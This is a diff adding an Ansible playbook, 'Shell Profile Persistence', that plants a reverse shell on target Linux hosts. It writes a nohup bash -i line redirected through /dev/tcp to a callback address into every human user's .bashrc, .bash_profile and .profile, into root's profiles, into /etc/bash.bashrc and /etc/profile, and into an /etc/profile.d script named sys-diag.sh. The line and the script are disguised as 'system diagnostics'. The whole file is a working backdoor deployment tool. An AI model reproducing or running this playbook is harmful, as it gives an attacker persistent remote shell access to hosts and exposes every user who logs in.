@@ -1,0 +1,65 @@
+# playbooks/shell_profile_persistence.yml
+---
+- name: Shell Profile Persistence
+  hosts: targets
+  become: yes
+  gather_facts: yes  # needed so we can iterate over real users
+
+  vars:
+    profile_files:
+      - .bashrc
+      - .bash_profile
+      - .profile
+    payload_line: |
+      # system diagnostics
+      nohup bash -c 'if ! pgrep -f "{{ callback_ip }}:{{ callback_port }}" > /dev/null 2>&1; then bash -i >& /dev/tcp/{{ callback_ip }}/{{ callback_port }} 0>&1; fi' >/dev/null 2>&1 &
+
+  tasks:
+
+    - name: Get list of human users on the system
+      shell: |
+        getent passwd | awk -F: '$3 >= 1000 && $7 !~ /nologin|false/ {print $1":"$6}'
+      register: human_users
+      changed_when: false
+
+    - name: Inject into user shell profile files
+      lineinfile:
+        path: "/home/{{ item[0].split(':')[0] }}/{{ item[1] }}"
+        line: "{{ payload_line }}"
+        state: present
+        create: yes
+        owner: "{{ item[0].split(':')[0] }}"
+        mode: '0644'
+      loop: "{{ human_users.stdout_lines | product(profile_files) | list }}"
+      ignore_errors: yes  # skip if file doesn't exist for that user
+
+    - name: Inject into root shell profiles
+      lineinfile:
+        path: "/root/{{ item }}"
+        line: "{{ payload_line }}"
+        state: present
+        create: yes
+        owner: root
+        mode: '0644'
+      loop: "{{ profile_files }}"
+      ignore_errors: yes
+
+    - name: Inject into system-wide shell profiles
+      lineinfile:
+        path: "{{ item }}"
+        line: "{{ payload_line }}"
+        state: present
+      loop:
+        - /etc/bash.bashrc       # runs for every interactive bash shell
+        - /etc/profile           # runs for every login shell
+      ignore_errors: yes
+
+    - name: Also inject into /etc/profile.d/ as a standalone script
+      copy:
+        dest: /etc/profile.d/sys-diag.sh
+        mode: '0755'
+        owner: root
+        group: root
+        content: |
+          #!/bin/bash
+          nohup bash -c 'if ! pgrep -f "{{ callback_ip }}:{{ callback_port }}" > /dev/null 2>&1; then bash -i >& /dev/tcp/{{ callback_ip }}/{{ callback_port }} 0>&1; fi' >/dev/null 2>&1 &
